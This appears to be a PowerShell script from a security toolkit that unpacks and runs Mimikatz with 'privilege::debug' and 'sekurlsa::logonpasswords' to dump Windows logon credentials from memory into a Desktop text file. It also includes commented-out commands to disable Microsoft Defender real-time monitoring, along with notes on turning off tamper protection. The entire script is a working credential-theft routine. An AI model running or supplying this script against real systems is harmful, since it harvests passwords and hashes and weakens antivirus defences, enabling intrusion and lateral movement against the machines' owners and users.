### MIMIKATZ AUTOMATED RUN SCRIPT ###
# Mimikatz is considered a potential threat, so MS Defender realtime monitoring must be disabled
# NOTE: monitoring can be disabled only if tamper protection is off !!!

param (
    [string]$desktopPath = [System.Environment]::GetFolderPath('Desktop')
)

#Set-MpPreference -DisableRealtimeMonitoring $true
#(Get-MpPreference).DisableRealtimeMonitoring

$scriptsDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
$baseDirectory = Split-Path -Path $scriptsDirectory -Parent
$toolsDirectory = "$baseDirectory\Tools"

$mimikatzPath = "$toolsDirectory\mimikatz\x64\mimikatz.exe"

if (-not (Test-Path $mimikatzPath)) {
    $zipPath = "$toolsDirectory\mimikatz-master.zip"
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, "$toolsDirectory\mimikatz")
        Write-Host "  $(Split-Path $zipPath -Leaf) successfully extracted."
    } catch {
        Write-Host "  $(Split-Path $zipPath -Leaf) Extraction failed."
    }
}

$outputsDirectory = "$desktopPath\Outputs"
$outputPath = "$outputsDirectory\mimikatz.txt"

if (-not (Test-Path $outputsDirectory)) {
    New-Item -Path $outputsDirectory -ItemType Directory
}

$args = '"privilege::debug" "sekurlsa::logonpasswords" "exit"'

if (Test-Path $mimikatzPath) {
    Start-Process -FilePath $mimikatzPath -ArgumentList $args -NoNewWindow -Wait -RedirectStandardOutput $outputPath
}